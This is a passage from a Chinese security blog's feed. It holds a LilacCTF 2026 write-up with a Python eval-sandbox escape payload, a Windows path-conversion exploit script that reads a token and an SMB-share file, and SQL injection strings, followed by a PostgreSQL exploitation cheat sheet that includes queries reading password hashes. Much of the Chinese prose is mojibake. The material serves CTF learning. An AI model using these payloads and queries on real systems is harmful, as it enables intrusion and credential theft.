string">r'[_\s=+\[\],"\'\&lt;\>\-\*@#$%^&amp;\\\|\&#123;\&#125;\:;]'</span><span class="token punctuation">,</span> user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FORBIDDEN: Incorrect symbol detected"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'(status|flag|update|setattr|getattr|eval|exec|import|locals|os|sys|builtins|open|or|and|not|is|breakpoint|exit|print|quit|help|input|globals)'</span><span class="token punctuation">,</span> user_input<span class="token punctuation">.</span>casefold<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FORBIDDEN: Keywords detected"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">60</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FORBIDDEN: Input too long! Keep it concise and it is very simple."</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token builtin">eval</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span>                <span class="token keyword">if</span> status<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">and</span> <span class="token builtin">id</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token operator">==</span> status_id<span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                flag <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"SUCCESS! Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"FAILURE: status is still </span><span class="token interpolation"><span class="token punctuation">&#123;</span>status<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Don't be evil~ And I won't show you this error :)"</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    sandbox<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>No numbers or alphasï¼šæ•°å­—å’Œå¤§å†™å­—æ¯<br>Incorrect symbol detectedï¼š_ï¼Œ+ï¼Œ;ï¼Œâ€™ï¼Œâ€ï¼Œç©ºæ ¼ï¼Œæ¢è¡Œï¼Œ&lt;&gt;ï¼Œ&amp;ï¼Œ^ï¼Œ<code>-~</code>ï¼Œ<code>-(</code><br>Keywords detectedï¼šhelpï¼Œevalï¼Œexecï¼Œopenï¼Œsystemï¼Œglobalsï¼Œbuiltinsï¼Œosï¼Œlocalsï¼Œbreakpointï¼Œgetattrï¼Œimportï¼Œisï¼Œflagï¼Œnotï¼Œstatus</p><p>é™é•¿ 60</p><p>fuzz çš„å¯ç”¨ç»“æœï¼šcompileï¼Œlicenseï¼Œvarsï¼Œcreditsï¼Œdirï¼Œdictï¼Œintï¼Œfloatï¼Œstrï¼Œminï¼Œgetï¼Œextendï¼Œreverseï¼Œjoinï¼Œitemsï¼Œlenï¼Œin</p><p>å¯ä»¥æ„é€ å‡ºè¿™æ ·ä¸€ä¸ª payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿”å›</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">FAILURE<span class="token punctuation">:</span> status <span class="token keyword">is</span> still <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'status'</span><span class="token punctuation">,</span> <span class="token string">'status_id'</span><span class="token punctuation">,</span> <span class="token string">'user_input'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span>license<span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>FAILURE<span class="token punctuation">:</span> status <span class="token keyword">is</span> still <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'_Printer__name'</span><span class="token punctuation">,</span> <span class="token string">'license'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'_Printer__data'</span><span class="token punctuation">,</span> <span class="token string">'See https://www.python.org/psf/license/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'_Printer__lines'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'_Printer__filenames'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'/usr/local/lib/python3.14/../LICENSE.txt'</span><span class="token punctuation">,</span> <span class="token string">'/usr/local/lib/python3.14/../LICENSE'</span><span class="token punctuation">,</span> <span class="token string">'/usr/local/lib/python3.14/LICENSE.txt'</span><span class="token punctuation">,</span> <span class="token string">'/usr/local/lib/python3.14/LICENSE'</span><span class="token punctuation">,</span> <span class="token string">'./LICENSE.txt'</span><span class="token punctuation">,</span> <span class="token string">'./LICENSE'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¯çŸ¥ç‰ˆæœ¬æ˜¯ python 3.14</p><p>è·å– status is still åˆ—è¡¨çš„æ–¹æ³•ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŠŠå›æ˜¾çš„ç»“æœæ‹¼åœ¨ list åé¢ï¼Œæµ‹è¯•å¾—çŸ¥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">,</span> <span class="token string">'status_id'</span><span class="token punctuation">,</span> <span class="token string">'user_input'</span><span class="token punctuation">]</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">,</span> <span class="token string">'status_id'</span><span class="token punctuation">,</span> <span class="token string">'user_input'</span><span class="token punctuation">&#125;</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">'status'</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span>dict_items<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'status'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'status_id'</span><span class="token punctuation">,</span><span class="token number">140205775626528</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'user_input'</span><span class="token punctuation">,</span><span class="token string">'vars().get(min(dir())).append(vars().items())'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠŠ <code>min(vars())</code> æ¢æˆ <code>min(dir())</code> å¯ä»¥èŠ‚çœä¸€ä¸ªå­—ç¬¦</p><p>çŒœæµ‹ç›®æ ‡æ˜¯è®© status ä¸º Trueï¼Œé‚£ä¹ˆéœ€è¦çœŸå€¼</p><p>è¿™é‡Œå°±ä¼šæ¶‰åŠåˆ°ä¸€ä¸ªé—®é¢˜ï¼Œç°åœ¨æˆ‘ä»¬æ²¡æœ‰è·å–æ•°å€¼ 1 çš„æ–¹æ³•ï¼Œåˆ°è¿™é‡Œå¦‚æœæ²¡æ‹¿åˆ°æºç çš„è¯å¾ˆéš¾çŒœåˆ°è¿™é‡Œçš„é€»è¾‘æ˜¯ <code>if status[0] and id(status) == status_id</code></p><p>åªéœ€è¦ä»»æ„é 0 æ•°å€¼å³å¯æˆåŠŸâ€¦</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token number">1</span><span class="token number">0</span><span class="token operator">>></span><span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">1</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è·å– -1 çš„æ–¹æ³•æœ‰ä¸å°‘ï¼š<code>~(int())</code></p><p>ä¸è¿‡æˆ‘ä»¬éœ€è¦æŠŠåŸå…ˆçš„ False å»æ‰ï¼Œä¹Ÿå°±æ˜¯è¦ pop()</p><p>æœ€ç»ˆ payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">~</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2026/01/24/LilacCTF-2026/IMG-20260127111648585.png"></p><hr><h1 id="Nailongï¼ˆUnsolvedï¼‰"><a href="#Nailongï¼ˆUnsolvedï¼‰" class="headerlink" title="Nailongï¼ˆUnsolvedï¼‰"></a>Nailongï¼ˆUnsolvedï¼‰</h1><p>Streamlit æ¡†æ¶ï¼Œä½¿ç”¨ Huggingface çš„æ¨¡å‹æ‰«æå™¨ï¼ˆPicklescanï¼‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> torchvision <span class="token keyword">import</span> transforms<span class="token punctuation">,</span> modelsmodel <span class="token operator">=</span> models<span class="token punctuation">.</span>resnet50<span class="token punctuation">(</span>weights<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>num_features <span class="token operator">=</span> model<span class="token punctuation">.</span>fc<span class="token punctuation">.</span>in_featuresmodel<span class="token punctuation">.</span>fc <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>num_features<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span>model_path<span class="token punctuation">,</span> `map_location<span class="token operator">=</span>torch<span class="token punctuation">.</span>device<span class="token punctuation">(</span><span class="token string">'cpu'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> weights_only<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•å‘ç° Picklescan ä¼šè¿”å› Innocuousã€ suspiciousã€dangerous</p><hr><h1 id="Path"><a href="#Path" class="headerlink" title="Path"></a>Path</h1><p>é¢˜ç›®å¼€å¤´ <code>Win32 â†’ NT Path Conversion Challenge</code></p><p>å¯æœåˆ°ï¼š <a href="https://projectzero.google/2016/02/the-definitive-guide-on-win32-to-nt.html">https://projectzero.google/2016/02/the-definitive-guide-on-win32-to-nt.html</a></p><p>&#x2F;api&#x2F;infoï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"challenge"</span><span class="token operator">:</span> <span class="token string">"Path Maze"</span><span class="token punctuation">,</span>    <span class="token property">"hints"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token string">"Stage 1: Find and read the access token from the system"</span><span class="token punctuation">,</span>      <span class="token string">"Stage 2: Use the token to access the backup server"</span><span class="token punctuation">,</span>      <span class="token string">"Token location: C:\\token\\access_key.txt"</span><span class="token punctuation">,</span>      <span class="token string">"Backup server: 172.20.0.10"</span><span class="token punctuation">,</span>      <span class="token string">"Backup server SMB Share name: backup"</span><span class="token punctuation">,</span>      <span class="token string">"Flag file: flag.txt"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"stages"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"success"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åç”±äº token æ¯æ¬¡è·å–åªèƒ½ç”¨ä¸€æ¬¡ï¼Œå†™ä¸ªè„šæœ¬åˆ©ç”¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">"http://1.95.51.2:8080"</span>res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span>                    <span class="token string">'/api/diag/read?path=\\\\?\C:\\token\\access_key.txt'</span><span class="token punctuation">)</span>token <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>res1<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">"\\\\?\\GLOBALROOT\\??\\UNC\\172.20.0.10\\backup\\flag.txt"</span>res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'/api/export/read?path=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token operator">+</span>                    <span class="token string-interpolation"><span class="token string">f'&amp;token=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="safe-sqlï¼ˆUnsolvedï¼‰"><a href="#safe-sqlï¼ˆUnsolvedï¼‰" class="headerlink" title="safe-sqlï¼ˆUnsolvedï¼‰"></a>safe-sqlï¼ˆUnsolvedï¼‰</h1><p>å¼•å·å‡è¢« banï¼Œç›´æ¥è½¬ä¹‰å®ç°é—­åˆï¼Œæµ‹è¯•å‘ç°æ³¨é‡Šç¬¦ä¸º <code>-- </code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'1\' and password = '</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶è¿”å› <code>&#123;&quot;reason&quot;:&quot;No such user or wrong credentials.&quot;,&quot;status&quot;:&quot;failure&quot;&#125;</code></p><p>ç„¶åå¦‚æœæ²¡æ³¨é‡Šæ‰çš„è¯ä¼šè¿”å› <code>&#123;&quot;reason&quot;:&quot;Something Error.&quot;,&quot;status&quot;:&quot;error&quot;&#125;</code></p><p>é‚£ä¹ˆå¯ä»¥å°è¯•æ‰“å¸ƒå°”æ³¨å…¥ï¼Œæµ‹è¯•å‘ç°åªæœ‰ <code>CASE WHEN</code> å¯ç”¨ï¼ˆä¸è¡Œï¼‰ï¼Œå¯ä»¥ç¡®å®šæ˜¯è€ç‰ˆæœ¬çš„ postgresql</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"1\\"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"or (CASE WHEN (1>0) THEN 1 ELSE 0 END)=1-- "</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.xmcve.com/2026/01/27/LilacCTF-2026-Writeup/&quot;&gt;https://blog.xmcve.com/2026/01/27/LilacCTF-2026-Writeup/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://lilachit.notion.site/LilacCTF-2026-Official-WriteUp-2f44c775ef0e80ba8398f120cd4c59d1&quot;&gt;https://lilachit.notion.site/LilacCTF-2026-Official-WriteUp-2f44c775ef0e80ba8398f120cd4c59d1&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="æ²™ç›’" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%B2%99%E7%9B%92/"/>
    
    <category term="Windows" scheme="http://c1oudfl0w0.github.io/blog/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>PostgreSQLåˆ©ç”¨</title>
    <link href="http://c1oudfl0w0.github.io/blog/2026/01/22/PostgreSQL%E5%88%A9%E7%94%A8/"/>
    <id>http://c1oudfl0w0.github.io/blog/2026/01/22/PostgreSQL%E5%88%A9%E7%94%A8/</id>
    <published>2026-01-21T18:01:52.000Z</published>
    <updated>2026-02-05T03:46:17.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://tttang.com/archive/1547">https://tttang.com/archive/1547</a></p><p><a href="https://blog.csdn.net/HatOfDragon/article/details/54601121">https://blog.csdn.net/HatOfDragon/article/details/54601121</a></p><p><a href="https://www.cnblogs.com/yilishazi/p/14710349.html">https://www.cnblogs.com/yilishazi/p/14710349.html</a></p><span id="more"></span><hr><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">-- è¯¦ç»†ä¿¡æ¯select version();-- ç‰ˆæœ¬ä¿¡æ¯show server_version;select pg_read_file(&#39;PG_VERSION&#39;, 0, 200);-- æ•°å­—ç‰ˆæœ¬ä¿¡æ¯åŒ…æ‹¬å°ç‰ˆå·SHOW server_version_num;SELECT current_setting(&#39;server_version_num&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ—ç›®å½•</p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">-- æ³¨æ„: åœ¨æ—©æœŸçš„ PostgreSQL ç‰ˆæœ¬ä¸­,pg_ls_dir ä¸å…è®¸ä½¿ç”¨ç»å¯¹è·¯å¾„select pg_ls_dir(&#39;&#x2F;etc&#39;);-- è·å– pgsql å®‰è£…ç›®å½•select setting from pg_settings where name &#x3D; &#39;data_directory&#39;;-- æŸ¥æ‰¾ pgsql é…ç½®æ–‡ä»¶è·¯å¾„select setting from pg_settings where name&#x3D;&#39;config_file&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ—æ•°æ®åº“</p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">SELECT datname FROM pg_database;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹æ”¯æŒçš„è¯­è¨€</p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">select * from pg_language;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹å®‰è£…çš„æ‰©å±•</p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">select * from pg_available_extensions;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹æœåŠ¡å™¨ ip åœ°å€</p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">select inet_server_addr()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="è´¦æˆ·æ“ä½œ"><a href="#è´¦æˆ·æ“ä½œ" class="headerlink" title="è´¦æˆ·æ“ä½œ"></a>è´¦æˆ·æ“ä½œ</h1><p>æŸ¥çœ‹å½“å‰ç”¨æˆ·æ˜¯ä¸æ˜¯ç®¡ç†å‘˜æƒé™</p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">SELECT current_setting(&#39;is_superuser&#39;);-- on ä»£è¡¨æ˜¯, off ä»£è¡¨ä¸æ˜¯SHOW is_superuser;SELECT usesuper FROM pg_user WHERE usename &#x3D; CURRENT_USER;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥è¯¢å¯†ç </p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">SELECT usename, passwd FROM pg_shadow;SELECT rolname,rolpassword FROM pg_authid;-- å½“å‰åŠ å¯†æ–¹å¼ï¼Œpassword_encryptionå‚æ•°å†³å®šäº†å¯†ç æ€ä¹ˆè¢«hashSELECT name,setting,source,enumvals FROM pg_settings WHERE name &#x3D; &#39;password_encryption&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h1><p>æ³¨é‡Šç¬¦ <code>--</code>ï¼Œ<code>/**/</code>ï¼ˆæ³¨æ„ postgres çš„è¿™ä¸ªæ³¨é‡Šç¬¦éœ€è¦æˆå¯¹ï¼‰</p><h2 id="å…³äºè½¬ä¹‰"><a href="#å…³äºè½¬ä¹‰" class="headerlink" title="å…³äºè½¬ä¹‰"></a>å…³äºè½¬ä¹‰</h2><p>postgresql 9 ä¹‹å‰ï¼Œåæ–œæ è½¬ä¹‰</p><p>postgresql 9 ä¹‹åï¼Œåæ–œæ å·²ç»å˜æˆäº†æ™®é€šå­—ç¬¦ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨åæ–œæ è½¬ä¹‰å¯ä»¥åœ¨éœ€è¦è½¬ä¹‰çš„å­—ç¬¦ä¸²å‰é¢åŠ ä¸ŠEï¼ˆEå°±æ˜¯Escapeï¼‰ï¼š</p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">SELECT * FROM user WHERE username LIKE E&#39;%\t%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>postgresql ä¸­å­—ç¬¦ä¸²éœ€è¦ç”¨å•å¼•å·åŒ…è£¹ï¼Œå¦‚æœä½¿ç”¨åŒå¼•å·ï¼Œç³»ç»Ÿå°†è®¤ä¸ºé‚£æ˜¯å˜é‡</p><p>æ‰€ä»¥æœ€å¸¸è§çš„è½¬ä¹‰å°±æ˜¯å¯¹å•å¼•å·çš„è½¬ä¹‰ï¼Œpostgresql å¯¹å•å¼•å·çš„è½¬ä¹‰æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">UPDATE user SET username &#x3D; &#39;Peter&#39;&#39;s Name&#39; WHERE id &#x3D; 1;UPDATE user SET username &#x3D; E&#39;Peter\s Name&#39; WHERE id &#x3D; 1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h2><p>å»¶æ—¶å‡½æ•°</p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">select pg_sleep(5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>if åˆ¤æ–­ï¼š</p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">select case when (1&gt;0) then 1 else 0 end<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tttang.com/archive/1547&quot;&gt;https://tttang.com/archive/1547&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/HatOfDragon/article/details/54601121&quot;&gt;https://blog.csdn.net/HatOfDragon/article/details/54601121&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/yilishazi/p/14710349.html&quot;&gt;https://www.cnblogs.com/yilishazi/p/14710349.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Postgres" scheme="http://c1oudfl0w0.github.io/blog/tags/Postgres/"/>
    
  </entry>
  
  <entry>
